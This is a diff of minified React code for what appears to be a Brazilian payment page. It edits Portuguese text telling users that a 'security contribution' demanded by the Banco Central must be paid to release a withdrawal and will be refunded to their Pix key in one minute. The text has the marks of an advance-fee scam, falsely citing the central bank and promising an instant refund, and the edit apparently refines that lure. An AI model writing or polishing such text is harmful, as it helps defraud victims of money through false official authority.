@@ -194,11 +194,11 @@ const xe = () => {
                 })]
             }), e.jsxs("p", {
                 className: "text-muted-foreground text-[14px] leading-relaxed",
-                children: ["Autenticação bancária exigida pelo Banco Central para liberação do saque de ", e.jsx("strong", {
-                    className: "text-foreground whitespace-nowrap",
+                children: ["Contribuição de segurança exigida pelo Banco Central para liberação do saque de ", e.jsx("strong", {
+                    className: "text-foreground",
                     children: n(m)
                 }), ". O valor de ", e.jsx("strong", {
-                    className: "text-foreground whitespace-nowrap",
+                    className: "text-foreground",
                     children: n(p)
                 }), " será devolvido integralmente na sua chave Pix em 1 minuto."]
             }), e.jsxs("div", {
